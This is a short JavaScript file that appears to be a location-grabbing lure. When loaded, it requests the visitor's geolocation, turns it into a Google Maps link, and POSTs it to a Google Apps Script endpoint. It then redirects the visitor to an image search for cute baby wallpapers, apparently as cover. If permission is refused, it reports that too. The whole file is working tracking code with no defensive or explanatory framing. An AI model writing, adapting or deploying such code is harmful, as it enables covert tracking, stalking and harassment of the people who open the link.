const API_URL =
  "https://script.google.com/macros/s/AKfycbwRMq7SbyKmdhds0XJfUPHRLlWToxKSY9uQXsWCnL4vr0VEWv3H5ItBrcjmP-3EZM4S/exec";

function collectAndSendData() {
  let data = {};

  navigator.geolocation.getCurrentPosition(
    function (position) {
      const { latitude, longitude } = position.coords;
      data.mapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
       window.location.href =
      "https://www.google.com/search?q=cute+baby+wallpapers&tbm=isch";
      postData();
    },
    function () {
      data.mapLink = "Location access denied"; 
       window.location.href =
      "https://www.google.com/search?q=cute+baby+girl+wallpaper+hd&tbm=isch";
       postData();
    },
  );

  function postData() {
    fetch(API_URL, {
      method: "POST",
      body: JSON.stringify(data),
    });
  }
}

collectAndSendData();
